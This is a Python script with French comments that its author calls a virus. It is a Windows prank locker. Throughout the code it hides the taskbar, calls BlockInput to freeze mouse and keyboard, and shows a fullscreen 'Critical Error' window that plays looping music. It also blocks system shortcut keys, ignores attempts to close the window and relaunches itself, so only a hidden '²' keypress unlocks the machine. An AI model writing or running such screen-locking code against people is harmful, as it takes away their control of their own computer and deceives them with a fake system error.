import ctypes
import tkinter as tk
from pynput import keyboard
import pygame
import threading
import os
import sys
import time

def block_input():
    ctypes.windll.user32.BlockInput(True)

def unblock_input():
    ctypes.windll.user32.BlockInput(False)

def disable_taskbar():
    hwnd_taskbar = ctypes.windll.user32.FindWindowW("Shell_TrayWnd", None)
    if hwnd_taskbar:
        ctypes.windll.user32.ShowWindow(hwnd_taskbar, 0)  # Masquer la barre des tâches
    hwnd_start = ctypes.windll.user32.FindWindowW("Button", None)
    if hwnd_start:
        ctypes.windll.user32.EnableWindow(hwnd_start, False)

def enable_taskbar():
    hwnd_taskbar = ctypes.windll.user32.FindWindowW("Shell_TrayWnd", None)
    if hwnd_taskbar:
        ctypes.windll.user32.ShowWindow(hwnd_taskbar, 1)  # Réafficher la barre des tâches
    hwnd_start = ctypes.windll.user32.FindWindowW("Button", None)
    if hwnd_start:
        ctypes.windll.user32.EnableWindow(hwnd_start, True)

def play_wii_sound():
    pygame.mixer.init()
    pygame.mixer.music.load("assets/musique_incroyable.mp3")

    pygame.mixer.music.play(-1)  # -1 pour jouer en boucle

def force_focus_on_window(root):
    while True:
        try:
            root.attributes("-topmost", True)
            root.focus_force()
            time.sleep(0.1)
        except:
            break

def block_system_shortcuts():
    def on_press(key):
        try:
            if key in [keyboard.Key.cmd, keyboard.Key.alt_l, keyboard.Key.alt_gr, keyboard.Key.tab]:
                return False
        except AttributeError:
            pass

    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

def fake_pc_error():
    global exit_gracefully
    exit_gracefully = False

    disable_taskbar()
    block_input()

    root = tk.Tk()
    root.title("Critical Error")
    root.attributes("-fullscreen", True)
    root.attributes("-topmost", True)
    root.configure(bg="black")  # Le fond de la fenêtre est noir
    root.config(cursor="none")

    # Créer un canvas pour ajouter un effet de fondu sans affecter le fond
    canvas = tk.Canvas(root, bg="black", bd=0, highlightthickness=0)
    canvas.pack(fill="both", expand=True)

    label = tk.Label(
        root,
        text="Skibidi said \nPlease just listen to this music",
        font=("Courier", 20),
        fg="white",
        bg="black",
        anchor="center",  # Centre le texte dans le label
        justify="center"    # Justifie chaque ligne individuellement à gauche
    )
    label.place(relx=0.5, rely=0.5, anchor="center")  # Centrer le label sur la fenêtre

    # Initialiser alpha à 0 (complètement transparent)
    root.attributes("-alpha", 0)

    # Effet de fondu
    def fade_in():
        for i in range(11):  # 11 étapes pour avoir une progression fluide
            alpha = i / 10  # Progressivement de 0 à 1
            root.after(i * 50, lambda alpha=alpha: root.attributes("-alpha", alpha))  # Appliquer la transparence

    fade_thread = threading.Thread(target=fade_in, daemon=True)
    fade_thread.start()

    def close_virus():
        global exit_gracefully
        exit_gracefully = True
        unblock_input()
        pygame.mixer.music.stop()
        enable_taskbar()
        root.destroy()

    def on_key_press(key):
        try:
            if key.char == "²":
                close_virus()
        except AttributeError:
            pass

    listener = keyboard.Listener(on_press=on_key_press)
    listener.start()

    focus_thread = threading.Thread(target=force_focus_on_window, args=(root,), daemon=True)
    focus_thread.start()

    root.protocol("WM_DELETE_WINDOW", lambda: None)
    root.mainloop()

def restart_program():
    python = sys.executable
    os.execl(python, python, *sys.argv)

if __name__ == "__main__":
    try:
        while True:
            shortcuts_thread = threading.Thread(target=block_system_shortcuts, daemon=True)
            shortcuts_thread.start()

            sound_thread = threading.Thread(target=play_wii_sound, daemon=True)
            sound_thread.start()

            fake_pc_error()

            if not exit_gracefully:
                time.sleep(1)
                restart_program()
            else:
                break

    finally:
        unblock_input()
        enable_taskbar()
